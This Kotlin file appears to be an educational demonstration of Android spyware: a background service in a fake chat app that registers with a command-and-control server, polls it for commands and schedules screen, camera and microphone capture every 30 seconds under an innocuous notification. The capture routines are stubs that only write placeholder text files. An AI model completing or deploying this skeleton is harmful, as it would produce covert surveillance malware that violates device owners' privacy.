package com.example.ChatterBox.malicious

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.PixelFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.SystemClock
import android.util.Log
import android.view.PixelCopy
import android.view.WindowManager
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.Timer
import java.util.TimerTask
import java.util.concurrent.Semaphore
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

// Import the C2 components
import com.example.ChatterBox.malicious.C2Config
import com.example.ChatterBox.malicious.C2Client

// Import annotations for suppressing warnings
import androidx.annotation.RequiresApi

/**
 * Background service that performs surveillance activities:
 * - Screen recording
 * - Camera access
 * - Microphone recording
 * 
 * FOR EDUCATIONAL DEMONSTRATION PURPOSES ONLY.
 */
class SurveillanceService : Service() {
    private val TAG = "SurveillanceDemo"
    private val NOTIFICATION_ID = 1337
    private val CHANNEL_ID = "surveillance_channel"
    
    private var timer: Timer? = null
    private var recordingThread: HandlerThread? = null
    private var recordingHandler: Handler? = null
    private val isRecording = AtomicBoolean(false)
    
    // Command polling thread and handler
    private var commandThread: HandlerThread? = null
    private var commandHandler: Handler? = null
    
    // C2 client for communication with the command and control server
    private lateinit var c2Client: C2Client
    
    // For camera access
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private val cameraOpenCloseLock = Semaphore(1)

    override fun onCreate() {
        super.onCreate()
        
        // Initialize the C2 client
        c2Client = C2Client(this)
        
        // Initialize command polling thread
        commandThread = HandlerThread("CommandThread").apply { start() }
        commandHandler = Handler(commandThread!!.looper)
        
        // Create notification channel for Android O and above
        createNotificationChannel()
        
        // Start as a foreground service to avoid system killing it
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)
        
        // Initialize background thread for processing
        recordingThread = HandlerThread("RecordingThread").apply { start() }
        recordingHandler = Handler(recordingThread!!.looper)
        
        Log.d(TAG, "Surveillance service created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service starting...")
        
        // Register with the C2 server
        c2Client.registerDevice()
        
        // Schedule surveillance activities every 30 seconds
        startSurveillanceTimer()
        
        // Start checking for commands from the C2 server
        startCommandPolling()
        
        // If service is killed, restart it
        return START_STICKY
    }

    private fun startSurveillanceTimer() {
        timer?.cancel()
        timer = Timer()
        
        timer?.scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                if (!isRecording.get()) {
                    recordingHandler?.post {
                        isRecording.set(true)
                        
                        try {
                            // Capture all surveillance data
                            captureScreen()
                            captureCamera()
                            recordAudio()
                        } catch (e: Exception) {
                            Log.e(TAG, "Error in surveillance routine", e)
                        } finally {
                            isRecording.set(false)
                        }
                    }
                }
            }
        }, 5000, 30000) // Initial delay 5 seconds, then every 30 seconds
    }

    /**
     * Create the notification channel for Android O and above
     */
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createNotificationChannelO()
        }
    }
    
    /**
     * Implementation of createNotificationChannel for Android O and above
     * Extracted to separate method to avoid lint errors in older Android versions
     */
    @RequiresApi(Build.VERSION_CODES.O)
    private fun createNotificationChannelO() {
        val name = "App Service"
        val descriptionText = "Background service for enhanced functionality"
        val importance = NotificationManager.IMPORTANCE_LOW
        
        val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
            description = descriptionText
        }
        
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.createNotificationChannel(channel)
    }

    private fun createNotification(): Notification {
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("ChatterBox")
            .setContentText("App is running")
            // Using a default system icon instead of R.drawable reference
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            
        // Setting priority using property instead of method
        builder.priority = NotificationCompat.PRIORITY_LOW
        return builder.build()
    }

    // SCREEN CAPTURE FUNCTIONALITY
    private fun captureScreen() {
        Log.d(TAG, "Attempting to capture screen")
        
        // This is a simplified implementation. In a real malicious scenario,
        // this would use MediaProjection API with proper permission checks.
        // For demo purposes, we'll just simulate this.
        
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val filename = "screen_$timestamp.txt"
        
        val logFile = File(getExternalFilesDir(), filename)
        
        try {
            FileOutputStream(logFile).use { out ->
                val message = "SIMULATED SCREEN CAPTURE at $timestamp\n" +
                              "In a real implementation, this would capture the current screen.\n"
                
                out.write(message.toByteArray())
            }
            
            Log.d(TAG, "Screen capture simulated: $filename")
        } catch (e: Exception) {
            Log.e(TAG, "Error simulating screen capture", e)
        }
    }

    // CAMERA ACCESS FUNCTIONALITY
    private fun captureCamera() {
        Log.d(TAG, "Attempting to capture from camera")
        
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) 
                != PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "Camera permission not granted")
            return
        }
        
        // For demonstration, we'll simulate this instead of actually accessing the camera
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val filename = "camera_$timestamp.txt"
        
        val logFile = File(getExternalFilesDir(), filename)
        
        try {
            FileOutputStream(logFile).use { out ->
                val message = "SIMULATED CAMERA CAPTURE at $timestamp\n" +
                              "In a real implementation, this would take a photo with the camera.\n"
                
                out.write(message.toByteArray())
            }
            
            Log.d(TAG, "Camera capture simulated: $filename")
        } catch (e: Exception) {
            Log.e(TAG, "Error simulating camera capture", e)
        }
    }

    // AUDIO RECORDING FUNCTIONALITY
    private fun recordAudio() {
        Log.d(TAG, "Attempting to record audio")
        
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) 
                != PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "Audio recording permission not granted")
            return
        }
        
        // For demonstration, we'll simulate this instead of actually recording
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val filename = "audio_$timestamp.txt"
        
        val logFile = File(getExternalFilesDir(), filename)
        
        try {
            FileOutputStream(logFile).use { out ->
                val message = "SIMULATED AUDIO RECORDING at $timestamp\n" +
                              "In a real implementation, this would record 5 seconds of audio.\n"
                
                out.write(message.toByteArray())
            }
            
            Log.d(TAG, "Audio recording simulated: $filename")
        } catch (e: Exception) {
            Log.e(TAG, "Error simulating audio recording", e)
        }
    }

    private fun getExternalFilesDir(): File {
        val dir = File(Environment.getExternalStorageDirectory(), "ChatterBox/surveillance")
        if (!dir.exists()) {
            dir.mkdirs()
        }
        return dir
    }
    
    /**
     * Start polling for commands from the C2 server
     */
    private fun startCommandPolling() {
        // Make sure we have a valid command handler
        if (commandHandler == null) {
            Log.e(TAG, "Command handler is null")
            return
        }
        
        // Schedule regular checks for commands
        val commandRunnable = object : Runnable {
            override fun run() {
                try {
                    c2Client.checkForCommands { commands ->
                        if (commands.isNotEmpty()) {
                            Log.d(TAG, "Received ${commands.size} commands from C2 server")
                            processCommands(commands)
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error checking for commands", e)
                }
                
                // Schedule next check after a delay
                commandHandler?.postDelayed(this, 60 * 1000) // Every 1 minute
            }
        }
        
        // Start the polling process
        commandHandler?.post(commandRunnable)
    }
    
    /**
     * Process commands received from the C2 server
     */
    private fun processCommands(commands: List<String>) {
        for (command in commands) {
            try {
                when {
                    command.startsWith("capture_screen") -> {
                        Log.d(TAG, "Executing command: capture_screen")
                        // Show notification
                        showCommandNotification("Executing capture_screen command")
                        captureScreen()
                    }
                    command.startsWith("capture_camera") -> {
                        Log.d(TAG, "Executing command: capture_camera")
                        // Show notification
                        showCommandNotification("Executing capture_camera command")
                        captureCamera()
                    }
                    command.startsWith("record_audio") -> {
                        Log.d(TAG, "Executing command: record_audio")
                        // Show notification
                        showCommandNotification("Executing record_audio command")
                        recordAudio()
                    }
                    // More command types can be added here
                    else -> {
                        Log.d(TAG, "Unknown command: $command")
                        showCommandNotification("Received unknown command: $command")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error executing command: $command", e)
                showCommandNotification("Error executing command: $command")
            }
        }
    }
    
    /**
     * Show a temporary notification for command execution
     */
    private fun showCommandNotification(message: String) {
        val notificationId = System.currentTimeMillis().toInt()
        
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .setContentTitle("C2 Command Execution")
            .setContentText(message)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)
        
        val notification = builder.build()
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(notificationId, notification)
        
        // Auto-dismiss after 3 seconds
        Handler(Looper.getMainLooper()).postDelayed({
            notificationManager.cancel(notificationId)
        }, 3000)
    }

    override fun onDestroy() {
        timer?.cancel()
        timer = null
        
        // Clean up recording thread
        recordingThread?.quitSafely()
        
        // Clean up command thread
        commandThread?.quitSafely()
        commandThread = null
        commandHandler = null
        
        Log.d(TAG, "Surveillance service destroyed")
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
}
